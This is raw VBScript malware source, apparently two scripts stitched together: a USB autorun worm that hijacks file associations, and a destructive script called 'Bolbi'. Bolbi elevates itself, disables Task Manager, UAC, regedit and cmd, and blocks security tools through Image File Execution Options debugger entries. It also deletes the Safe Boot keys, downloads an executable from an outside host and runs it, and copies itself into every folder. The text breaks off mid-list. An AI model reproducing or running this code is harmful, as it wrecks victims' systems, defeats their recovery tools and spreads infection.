        inf_autorun = "[AutoRun]" & VBCRLF & "Shellexecute=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun=打开(&O)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun1=资源管理器(&X)" & VBCRLF & "shell\AutoRun1\command=WScript.exe " & Name_V1 & " ""AutoRun"""
        Call CopyFile(objfso, inf_autorun, path_autorun)
        Call SetFileAttr(objfso, path_autorun)
    End If
End Sub

'SZMTKAMLGPO1_6

'OUJUJWPWIWIVG2_25

Sub DeleteReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub

Function ReadReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function

Sub WriteReg(strkey, Value, vtype)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps = Nothing
End Sub

'SZMTKAMLGPO2_25

'OUJUJWPWIWIVG1_7

Sub InvadeSystem(objfso, vbsCode)
    On Error Resume Next
    Dim Value, HCULoad, vbsCode_Virus, dc, d

    Value = "%SystemRoot%\System32\WScript.exe " & """" & FullPath_V0 & """" & " %1 %* "
    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    vbsCode_Virus = vbsCode

    Set dc = objfso.Drives
    For Each d In dc
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            Call AutoRun(objfso, d.DriveLetter, vbsCode_Virus)
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True And GetVersion(objfso, FullPath_V1)< Version Then
        objfso.DeleteFile FullPath_V1 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    End If

    If objfso.FileExists(FullPath_V0) = True And GetVersion(objfso, FullPath_V0)<Version Then
        objfso.DeleteFile FullPath_V0 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    End If

    If ReadReg(HCULoad)<> FullPath_V1 Then
        Call WriteReg (HCULoad, FullPath_V1, "")
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call SetTxtFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call SetRegFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call SetchmFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call SethlpFileAss(FullPath_V0)
    End If

    Call DeSafeSet()
End Sub

'SZMTKAMLGPO1_7

'OUJUJWPWIWIVG1_1
On Error Resume Next
Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V
Dim ModelHead, ModelTail
Cnt = 0
CntMax = 9000
Version = "1"
Name_V1 = GetUserName() & ".vbs"
FullPath_V0 = GetSFolder(0) & Name_V1 '主要执行文件关联转向
FullPath_V1 = GetSFolder(1) & Name_V1 '主要执行配置文件命令
FullPath_Config= GetSFolder(1) & GetUserName() & ".ini"
Sum_ModelCode = 26
Head_V= GetHeadTail(0)
Tail_V= GetHeadTail(1)
ModelHead="'OUJUJWPWIWIVG"
ModelTail="'SZMTKAMLGPO"

Call VirusMain()
Sub VirusMain()
    On Error Resume Next
    Call ExeVbs_Virus()
End Sub

If WScript.Arguments.Named.Exists("elevated") = False Then
  CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
  WScript.Quit
End If
User = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%UserProfile%")
dim Key, fso, Eater
Set Key = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set Eater = fso.GetFile(Wscript.ScriptFullName)
BolbisName
SlapClap
Spirit
Write1
Message1
DownPic
DownBolbi
Holder
WriteFuk
RunFuk
FukYu
BolbiMessage
Sound
DownBye
RunBye
CounterRemoval
FindRecent
FindDrive("C:\")
LastChance
Clone1

Sub BolbisName
On Error Resume Next
Key.Regwrite "HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell","notepad.exe", "REG_SZ"
Key.Regwrite "HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName","Bolbi", "REG_SZ"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption","ATTENTION!", "REG_SZ"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext","Your PC has been wrecked by Bolbi!", "REG_SZ"
Key.Regwrite "HKCU\Control Panel\International\s1159","Bolbi", "REG_SZ"
Key.Regwrite "HKCU\Control Panel\International\s2359","Bolbi", "REG_SZ"
End Sub

Sub SlapClap
On Error Resume Next
Dim oFSO
Set oFSO = CreateObject("Scripting.FileSystemObject")
If NOT oFSO.FolderExists("C:\Users") Then oFSO.CreateFolder("C:\Users")
If NOT oFSO.FolderExists("C:\Users\Public") Then oFSO.CreateFolder("C:\Users\Public")
If NOT oFSO.FolderExists("C:\Users\Public\ghostroot") Then oFSO.CreateFolder("C:\Users\Public\ghostroot")
End Sub

Sub Spirit
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set Invisible1 = fso.getFolder("C:\Windows\")
Set Invisible2 = fso.getFolder("C:\Windows\System32")
Set Invisible3 = fso.getFolder("C:\Users\Public\ghostroot")
Set Invisible4 = fso.getFolder("C:\Program Files")
Invisible1.Attributes = Invisible1.Attributes or 2 ' 2 = hidden
Invisible2.Attributes = Invisible2.Attributes or 2 ' 2 = hidden
Invisible3.Attributes = Invisible3.Attributes or 2 ' 2 = hidden
Invisible4.Attributes = Invisible4.Attributes or 2 ' 2 = hidden
End Sub



Sub DownPic
On Error Resume Next
dim xHttp, bStrm
Set xHttp = createobject("Microsoft.XMLHTTP")
Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://i.imgur.com/8ydfdsE.jpg", False
 xHttp.Send

 with bStrm
 .type = 1
 .open
.write xHttp.responseBody
 .savetofile "C:\Users\Public\ghostroot\8ydfdsE.jpg", 2
End With
End Sub

Sub DownBolbi
On Error Resume Next
dim xHttp, bStrm
Set xHttp = createobject("Microsoft.XMLHTTP")
Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://pomfcat.000webhostapp.com/kusifxz.mp3", False
 xHttp.Send

 with bStrm
 .type = 1
 .Open
.write xHttp.responseBody
 .savetofile "C:\Users\Public\ghostroot\kusifxz.mp3", 1
End With
End Sub

Sub Holder
On Error Resume Next
WScript.Sleep 10000
dim Clapping, lel
Clapping = "C:\Users\Public\Ghostroot\Bolbi.vbs"
lel = "C:\Users\Public\ghostroot\8ydfdsE.jpg"
Key.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", lel
Key.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Bolbi", Clapping
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Bolbi", Clapping
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\TaskbarNoPinnedList", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPinningToTaskbar", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayItemsDisplay", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", "0", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuPinnedList", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList", "1", "REG_DWORD"
Key.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms,", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions" , "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab", "1", "REG_DWORD"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab", "1", "REG_DWORD"
Key.RegWrite "HKCU\Software\Microsoft\Command Processor\DisableUNCCheck", "1", "REG_DWORD"
End Sub

Sub WriteFuk
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\KillDora.bat")
file.Write "@echo off"
file.WriteBlankLines(1)
file.Write "%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"
file.WriteBlankLines(1)
file.Write "assoc .lnk=exefile"
file.WriteBlankLines(1)
file.Write "assoc .scr=dllfile"
file.WriteBlankLines(1)
file.Write "assoc .pif=dllfile"
file.WriteBlankLines(1)
file.Write "reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal"" /f"
file.WriteBlankLines(1)
file.Write "reg delete ""HKLM\System\CurrentControlSet\Control\SafeBoot\Network"" /f"
file.WriteBlankLines(1)
file.Write "taskkill /f /im explorer.exe && start explorer.exe"
file.WriteBlankLines(1)
file.Write "takeown /f C:\Windows\System32\"
file.WriteBlankLines(1)
file.Write "icacls C:\Windows\System32  /Grant Users:F"
file.WriteBlankLines(1)
file.Write "takeown /f C:\Windows\"
file.WriteBlankLines(1)
file.Write "icacls C:\Windows\  /Grant Users:F"
file.WriteBlankLines(1)
End Sub

Sub RunFuk
On Error Resume Next
Set KillDora = CreateObject ("Wscript.Shell") 
Dim Silent
Silent = "cmd /c C:\Users\Public\Ghostroot\KillDora.bat"
KillDora.Run Silent, 0, false
End Sub

Sub FukYu
On Error Resume Next
Wscript.Sleep 8000
End Sub

Sub BolbiMessage
On Error Resume Next
Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\Message.vbs")
file.Write "MsgBox ""You don't run this file"""
End Sub

Sub Clone1
WScript.Sleep 5000
On Error Resume Next
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "C:/Users/Public/ghostroot/kusifxz.mp3"
oPlayer.controls.play
While oPlayer.playState <> 1 ' 1 = Stopped
WScript.Sleep 100
Wend
End Sub

Sub Sound
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\Users\Public\ghostroot\Bolbi.vbs")
file.Write "Sound1"
file.WriteBlankLines(1)
file.Write "Sound2"
file.WriteBlankLines(2)
file.Write "Sub Sound1"
file.WriteBlankLines(1)
file.Write "Dim oPlayer"
file.WriteBlankLines(1)
file.Write "Set oPlayer = CreateObject(""WMPlayer.OCX"")"
file.WriteBlankLines(1)
file.Write "oPlayer.URL = ""C:/Users/Public/ghostroot/kusifxz.mp3"""
file.WriteBlankLines(1)
file.Write "While oPlayer.playState <> 1 ' 1 = Stopped"
file.WriteBlankLines(1)
file.Write "WScript.Sleep 100"
file.WriteBlankLines(1)
file.Write "Wend"
file.WriteBlankLines(2)
file.Write "Sound2"
file.WriteBlankLines(1)
file.Write "End Sub"
file.WriteBlankLines(2)
file.Write "Sound1"
file.WriteBlankLines(1)
file.Write "Sound2"
file.WriteBlankLines(2)
file.Write "Sub Sound2"
file.WriteBlankLines(1)
file.Write "Dim oPlayer"
file.WriteBlankLines(1)
file.Write "Set oPlayer = CreateObject(""WMPlayer.OCX"")"
file.WriteBlankLines(1)
file.Write "oPlayer.URL = ""C:/Users/Public/ghostroot/kusifxz.mp3"""
file.WriteBlankLines(1)
file.Write "While oPlayer.playState <> 1 ' 1 = Stopped"
file.WriteBlankLines(1)
file.Write "WScript.Sleep 100"
file.WriteBlankLines(1)
file.Write "Wend"
file.WriteBlankLines(2)
file.Write "Sound1"
file.WriteBlankLines(1)
file.Write "End Sub"
file.WriteBlankLines(1)
End Sub

Sub Write1
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile(User & "\Desktop\Bolbi.txt")
file.Write "SLAP SLAP SLAP CLAP CLAP CLAP"
End Sub

Sub CounterRemoval
WScript.Sleep 5000
On Error Resume Next
Key.Regwrite "HKCR\inffile\shell\Install\command\logoff.exe"
Key.Regwrite "HKCR\regfile\shell\open\command\logoff.exe"
Key.Regwrite "HKCR\VBSFile\Shell\Edit\Command\logoff.exe"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msert.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mssecse.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCui.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\icacls.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner32.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CCleaner64.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\vbsedit.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\htaedit.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\VirtualBox.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mbam.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\uTorrent.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\uninstall.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad++.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\adwcleaner_5.005.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\student.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\takeown.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit32.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit33.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\install.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\installer.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\update.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\updater.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\plugin-hang-ui.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmic.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mdsched.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\crashreporter.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\autoruns.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procxp.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "1", "REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", ""
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "cscript.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wscript.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "rpdbfk.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wmplayer.exe"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "explorer.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", ""
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "rpdbfk.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "cscript.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wscript.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "wmplayer.exe"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\", "explorer.exe"
End Sub

Sub DownBye
On Error Resume Next
dim xHttp, bStrm
Set xHttp = createobject("Microsoft.XMLHTTP")
Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://pomfcat.000webhostapp.com/rpdbfk.exe", False
 xHttp.Send

 with bStrm
 .type = 1
 .open
.write xHttp.responseBody
 .savetofile "C:\Users\Public\ghostroot\rpdbfk.exe", 2
End With
End Sub

Sub RunBye
On Error Resume Next
WScript.Sleep 9000
set fso=CreateObject("Scripting.FileSystemObject")
set shell=CreateObject("Wscript.Shell")
Shell.run "C:\Users\Public\ghostroot\rpdbfk.exe"
End Sub


Sub LastChance
On Error Resume Next
WScript.Sleep 5000
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
Key.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
Key.Regwrite "HKCR\exefile\shell\open\command\C:\Users\Public\ghostroot\rpdbfk.exe  %1 %*"
Key.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe\Debugger","wscript.exe C:\Users\Public\ghostroot\Message.vbs"
Key.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
End Sub

Sub FindDrive (CopyMachine)
On Error Resume Next
Dim Car
If fso.DriveExists(CopyMachine) Then
Set Car = fso.GetDrive(fso.GetDriveName(CopyMachine))
If Car.DriveType = 1 Or Car.DriveType = 2 Then
Cloner (CopyMachine & "\ayylmao.vbs")
FindFolder (CopyMachine)
End If
End If
End Sub

Sub FindFolder (CopyMachine)
On Error Resume Next
If CopyMachine = "" Then Exit Sub
if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(CopyMachine).SubFolders
Cloner(target & "\Treasure.vbs")
Cloner(target & "\Slap.vbs")
Cloner(target & "\Slap1.vbs")
Cloner(target & "\Slap2.vbs")
Cloner(target & "\Slap3.vbs")
Cloner(target & "\Slap4.vbs")
Cloner(target & "\Slap5.vbs")
Cloner(target & "\Slap6.vbs")
Cloner(target & "\Slap7.vbs")
Cloner(target & "\Slap8.vbs")
Cloner(target & "\Slap9.vbs")
Cloner(target & "\Slap10.vbs")
Cloner(target & "\Slap11.vbs")
Cloner(target & "\Slap12.vbs")
Cloner(target & "\Slap13.vbs")
Cloner(target & "\Slap14.vbs")
Cloner(target & "\Slap15.vbs")
Cloner(target & "\Slap16.vbs")
Cloner(target & "\Slap17.vbs")
Cloner(target & "\Slap18.vbs")
Cloner(target & "\Slap19.vbs")
Cloner(target & "\Slap20.vbs")
Cloner(target & "\Slap21.vbs")
Cloner(target & "\Slap22.vbs")
Cloner(target & "\Slap23.vbs")
Cloner(target & "\Slap24.vbs")
Cloner(target & "\Slap25.vbs")
Cloner(target & "\Slap26.vbs")
Cloner(target & "\Slap27.vbs")
Cloner(target & "\Slap28.vbs")
Cloner(target & "\Slap29.vbs")
Cloner(target & "\Slap30.vbs")
Cloner(target & "\Slap31.vbs")
Cloner(target & "\Slap32.vbs")
Cloner(target & "\Slap33.vbs")
Cloner(target & "\Slap34.vbs")
Cloner(target & "\Slap35.vbs")
Cloner(target & "\Slap36.vbs")
Cloner(target & "\Slap37.vbs")
Cloner(target & "\Slap38.vbs")
Cloner(target & "\Slap39.vbs")
Cloner(target & "\Slap40.vbs")
Cloner(target & "\Slap41.vbs")
Cloner(target & "\Slap42.vbs")
Cloner(target & "\Slap43.vbs")
Cloner(target & "\Slap44.vbs")
Cloner(target & "\Slap45.vbs")
Cloner(target & "\Slap46.vbs")
Cloner(target & "\Slap47.vbs")
Cloner(target & "\Slap48.vbs")
Cloner(target & "\Slap49.vbs")
Cloner(target & "\Slap50.vbs")
Cloner(target & "\Slap51.vbs")
Cloner(target & "\Slap52.vbs")
Cloner(target & "\Slap53.vbs")
Cloner(target & "\Slap54.vbs")
Cloner(target & "\Slap55.vbs")
Cloner(target & "\Slap56.vbs")
Cloner(target & "\Slap57.vbs")
Cloner(target & "\Slap58.vbs")
Cloner(target & "\Slap59.vbs")
Cloner(target & "\Slap60.vbs")
Cloner(target & "\Slap61.vbs")
Cloner(target & "\Slap62.vbs")
Cloner(target & "\Slap63.vbs")
Cloner(target & "\Slap64.vbs")
Cloner(target & "\Slap65.vbs")
Cloner(target & "\Slap66.vbs")
Cloner(target & "\Slap67.vbs")
Cloner(target & "\Slap68.vbs")
Cloner(target & "\Slap69.vbs")
Cloner(target & "\Slap70.vbs")
Cloner(target & "\Slap71.vbs")
Cloner(target & "\Slap72.vbs")
Cloner(target & "\Slap73.vbs")
Cloner(target & "\Slap74.vbs")
Cloner(target & "\Slap75.vbs")
Cloner(target & "\Slap76.vbs")
Cloner(target & "\Slap77.vbs")
